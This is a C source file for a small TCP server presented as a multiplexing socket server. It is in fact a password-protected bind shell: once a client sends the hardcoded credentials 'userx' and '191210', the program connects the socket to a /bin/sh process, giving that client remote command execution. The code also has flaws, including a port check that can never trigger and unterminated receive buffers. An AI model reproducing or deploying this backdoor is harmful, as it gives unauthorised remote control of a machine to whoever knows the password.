/***************************************************************************
* File: MacGyver_server.c                                                          *
* Copyright 15/07/2012 UserX <userx@gmail.com>                             *
*                                                                          *
* This program is free software; you can redistribute it and/or modify     *
* it under the terms of the GNU General Public License as published by     *
* the Free Software Foundation; either version 2 of the License, or        *
* (at your option) any later version.                                      *
*                                                                          *
* This program is distributed in the hope that it will be useful,          *
* but WITHOUT ANY WARRANTY; without even the implied warranty of           *
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            *
* GNU General Public License for more details.                             *
*                                                                          *
* You should have received a copy of the GNU General Public License        *
* along with this program; if not, write to the Free Software              *
* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,               *
* MA 02110-1301, USA.                                                      *
*                                                                          *
*                                                                          *
***************************************************************************/


//*********************************************************
//	Socket server with select function for multiplex ::
//*********************************************************

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/times.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "headers/dump_io.h"
#include "headers/shell_fnct.h"
#include "headers/exceptions.h"
#include "headers/color_rset.h"

#define TRUE	1
#define FALSE	0
#define BACKLOG 5
#define MAXLINE 4096
#define MINLINE 16
#define min(a,b) (a < b ? a : b)
#define max(a,b) (a > b ? a : b)

int main(int argc, char ** argv){
	int sockfd;
	int nsockfd;
	int maxfd;
	int recv_l;
	int send_l;
	int port;
	int yes;
	int flag;

	char sendline[MAXLINE];
	char recvline[MAXLINE];

	char user[MINLINE];
	char passwd[MINLINE];

	socklen_t sin_size;
	fd_set rset;

	struct sockaddr_in server;
	struct sockaddr_in client;

	char * const sh[] = { "/bin/sh", NULL };

	if(argc !=2){
		fprintf(stderr, "%s[!!] Usage: %s <port>%s\n", T_RED, argv[0], T_WHITE);
		exit(-1);
	}

	port = atoi(argv[1]);
	yes = 1;
	flag = 0;
	if(port > 65535 && port < 1024){
		fprintf(stderr, "%s[!!] try using a bigger port 65535 and less than 1024 [!!]%s\n", T_RED, T_WHITE);
		exit(-1);
	}

	sockfd = socket(PF_INET, SOCK_STREAM, 0);
	if(sockfd < 0){
		perror("in socket()");
		exit(-1);
	}
	printf("socket() is OK...\n");

	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0){
		perror("in setsockopt()");
		exit(-1);
	}
	printf("setsockop() is OK...\n");

	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = INADDR_ANY;
	memset(&(server.sin_zero), '\0', 8);

	if((bind(sockfd, (struct sockaddr *)&server, sizeof(struct sockaddr_in))) < 0){
		perror("in bind()");
		exit(-1);
	}
	printf("bind() is OK...\n");

	if(listen(sockfd, BACKLOG)){
		perror("in listen()");
		exit(-1);
	}
	printf("listen() is OK...\n");

	sin_size = sizeof(struct sockaddr_in);

	while(TRUE){
		nsockfd = accept(sockfd, (struct sockaddr *)&client, &sin_size);
		if(nsockfd < 0){
			perror("in accept()");
			exit(-1);
		}
		printf("accept() is OK...\n");
		FD_ZERO(&rset);
		FD_SET(nsockfd, &rset);
		maxfd = nsockfd;
		select(maxfd + 1, &rset, NULL, NULL, NULL);
		for(;;){
			if(FD_ISSET(nsockfd, &rset)){
				recv_l = recv(nsockfd, recvline, MAXLINE, 0);
				if(recv_l < 0){
					fatal("receiving connection");
				}else if(recv_l == 0){
					printf("%s-==[!!] Connection interrupted [!!]==-%s", T_RED, T_WHITE);
					flag = 0;
					break;
				}else{
					str_format(recvline);
					if(flag == 0){
						if(strlen(recvline) <= 16){
							recvline[strlen(recvline) - 1] = '\0';
							strcpy(user, recvline);
							flag = 1;
						}
					}else{
						recvline[strlen(recvline) - 1] = '\0';
						if(strlen(recvline) <= 16){
							strcpy(passwd, recvline);
							flag = 0;
						}

					}
					memset(recvline, '\0', MAXLINE);
				}
				if(!strcmp(user, "userx")){
					if(!strcmp(passwd, "191210")){
						close(0);
						close(1);
						close(2);
						dup2(nsockfd, 0);
						dup2(nsockfd, 1);
						dup2(nsockfd, 2);
						execve(sh[0], sh, NULL);
						close(nsockfd);
					}
				}else{
					fprintf(stderr, "%s-==[WARNING] Wrong User of Passwd [!!]==-%s\n", T_RED, T_WHITE);
					close(nsockfd);
					break;
				}

			}
		}
	}
	return 0;
}
